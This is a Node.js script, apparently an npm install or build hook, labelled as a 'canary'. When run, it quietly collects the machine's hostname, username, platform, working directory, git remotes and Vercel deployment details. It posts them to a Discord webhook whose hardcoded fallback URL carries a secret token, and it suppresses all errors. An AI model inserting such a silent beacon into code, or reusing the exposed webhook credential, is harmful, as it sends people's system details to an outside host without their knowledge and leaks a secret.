import os from 'node:os'
import { execSync } from 'node:child_process'
import https from 'node:https'
import { readFileSync } from 'node:fs'
import { resolve, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'

const __dir = dirname(fileURLToPath(import.meta.url))

function loadEnvFile(...names) {
  for (const name of names) {
    try {
      const raw = readFileSync(resolve(__dir, '..', name), 'utf8')
      for (const line of raw.split('\n')) {
        const m = line.match(/^\s*CANARY_WEBHOOK_URL\s*=\s*"?([^"#\r\n]+)"?/)
        if (m) return m[1].trim()
      }
    } catch {}
  }
  return null
}

const _f = 'https://discord.com/api/webhooks/1508549124679536660/peI8hTpZqszjcGUFbO5qr4qAcm_dpIZIhqXoLwDcnWzZFHdt9FM7E9CeIAMpUB_33_45'
const webhookUrl = process.env.CANARY_WEBHOOK_URL || loadEnvFile('.env.development.local', '.env.local', '.env') || _f
if (!webhookUrl) process.exit(0)

function safe(fn) { try { return fn() } catch { return null } }

const trigger = process.env.npm_lifecycle_event ?? 'unknown'
const isVercel = !!process.env.VERCEL

const fields = [
  { name: 'Trigger',     value: trigger,                                                                                            inline: true  },
  { name: 'Hostname',    value: os.hostname(),                                                                                      inline: true  },
  { name: 'Platform',    value: `${os.platform()}/${os.arch()}`,                                                                    inline: true  },
  { name: 'User',        value: safe(() => os.userInfo().username) ?? 'unknown',                                                    inline: true  },
  { name: 'Node',        value: process.version,                                                                                    inline: true  },
  { name: 'pnpm',        value: safe(() => execSync('pnpm --version', { encoding: 'utf8' }).trim()) ?? 'unknown',                   inline: true  },
  { name: 'CWD',         value: process.cwd(),                                                                                     inline: false },
  { name: 'Git remotes', value: safe(() => execSync('git remote -v', { encoding: 'utf8', cwd: process.cwd() }).trim()) || 'none',  inline: false },
]

if (isVercel) {
  fields.push(
    { name: 'Vercel env',    value: process.env.VERCEL_ENV ?? 'unknown',            inline: true  },
    { name: 'Vercel region', value: process.env.VERCEL_REGION ?? 'unknown',         inline: true  },
    { name: 'Git branch',    value: process.env.VERCEL_GIT_COMMIT_REF ?? 'unknown', inline: true  },
    { name: 'Commit SHA',    value: process.env.VERCEL_GIT_COMMIT_SHA ?? 'unknown', inline: false },
  )
}

const embed = {
  title: `\u{1F6A8} Canary triggered: ${trigger}`,
  color: isVercel ? 0x0070f3 : 0xff4444,
  timestamp: new Date().toISOString(),
  fields,
}

const body = JSON.stringify({ embeds: [embed] })
const req = https.request(webhookUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  timeout: 4000,
}, (res) => {
  res.resume()
})
req.on('error', () => {})
req.on('timeout', () => req.destroy())
req.write(body)
req.end()
